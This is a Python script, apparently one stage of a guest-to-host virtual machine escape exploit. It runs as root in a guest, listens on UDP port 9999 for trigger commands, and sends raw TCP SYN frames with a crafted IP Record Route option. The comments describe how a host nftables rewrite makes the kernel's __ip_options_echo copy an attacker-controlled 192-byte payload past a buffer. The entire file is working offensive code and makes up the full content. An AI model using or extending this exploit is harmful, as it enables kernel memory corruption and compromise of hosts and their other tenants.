#!/usr/bin/env python3
# r8waiter.py -- guest-side nft overflower waiter (L2, root).
# Binds UDP 192.168.250.114:9999. On "GON <ovsp> <ovseq> <hexpayload>"
# sends the nft-flow overflower SYN through virtio-net: IHL=6 with a 4-byte
# RR option [7,4,4,0]. The host's nft INPUT rule (sport-conditioned) sets
# ip[21] (RR length) to 0x40 (dry) / 0xE0 (fire), so __ip_options_echo copies
# 64/224 bytes from IP+20 into dopt->__data (obj+32).
# Geometry (IHL=6): TCP header at IP+24, payload at IP+44;
#   copy obj+32+k <- IP+20+k  =>  payload[8..39]  -> X+0..31  (work header)
#                              =>  payload[8..199] -> X+0..191 (fire layout)
# The waiter sends 8 filler bytes + the 192-byte work payload (200 total).
# No vnet-csum games: the frame carries correct checksums; the nft rule does
# the mangle. Reply: "OK <us>".
import socket, struct, sys, time, signal
sys.path.insert(0, "/tmp")
import guest_exploit as ge

def _log_sig(s, f):
    try: open("/tmp/r8wait.log", "a").write("SIGNAL %d\n" % s)
    except Exception: pass
for _s in (signal.SIGHUP, signal.SIGTERM, signal.SIGINT, signal.SIGQUIT, signal.SIGPIPE):
    signal.signal(_s, _log_sig)

def csum16(d):
    if len(d) % 2: d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d)//2), d))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def overflower_frame(sport, seq, payload200):
    ihl = 24; thlen = 20
    ip = bytearray(ihl + thlen + len(payload200))
    ip[0] = 0x46                                  # v4, IHL=6 (4-byte option area)
    struct.pack_into(">H", ip, 2, len(ip)); struct.pack_into(">H", ip, 4, 0x4343)
    ip[8] = 64; ip[9] = 6
    ip[12:16] = ge.src4; ip[16:20] = ge.dst4
    ip[20:24] = bytes([7, 4, 5, 0])               # RR(len 4, ptr 5>len -> compile-valid), EOL pad
                                                 # (ptr==len fails ip_options_compile: ptr+3>len -> error -> drop)
                                                 # nft SET rewrites ip[21] to 0x40/0xE0 at INPUT.
    th = memoryview(ip)[ihl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4; th[13] = 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    th[thlen:] = payload200
    pseudo = ge.src4 + ge.dst4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload200))
    struct.pack_into(">H", th, 16, csum16(pseudo + bytes(th[:thlen + len(payload200)])))
    struct.pack_into(">H", ip, 10, 0)
    struct.pack_into(">H", ip, 10, csum16(bytes(ip[:ihl])))
    eth = ge.macd + ge.macs + struct.pack(">H", 0x8100) + b"\0\0" \
        + struct.pack(">H", 0x8100) + b"\0\0" + struct.pack(">H", 0x0800)
    return bytes(10) + eth + bytes(ip)

def main():
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rx.bind(("0.0.0.0", 9999))
    tx = ge.sock()
    print("r8waiter ready (nft flow, IHL=6/4B RR)", flush=True)
    while True:
        data, addr = rx.recvfrom(65535)
        try:
            msg = data.decode(errors="replace").split()
            if not msg:
                continue
            if msg[0] == "PING":
                rx.sendto(b"PONG", addr)
                continue
            if msg[0] != "GON":
                continue
            ovsp = int(msg[1]); ovseq = int(msg[2], 0)
            work = bytes.fromhex(msg[3])            # 192-byte work payload
            payload200 = b"NFTSHIFT" + work         # 8 filler + 192 = 200; payload[8..39] -> X+0..31 (dry), [8..199] -> X+0..191 (fire)
            t0 = time.time()
            tx.send(overflower_frame(ovsp, ovseq, payload200))
            rx.sendto(("OK %.0f" % ((time.time() - t0) * 1e6)).encode(), addr)
        except Exception as e:
            try: rx.sendto(("ERR %s" % e).encode(), addr)
            except Exception: pass

main()
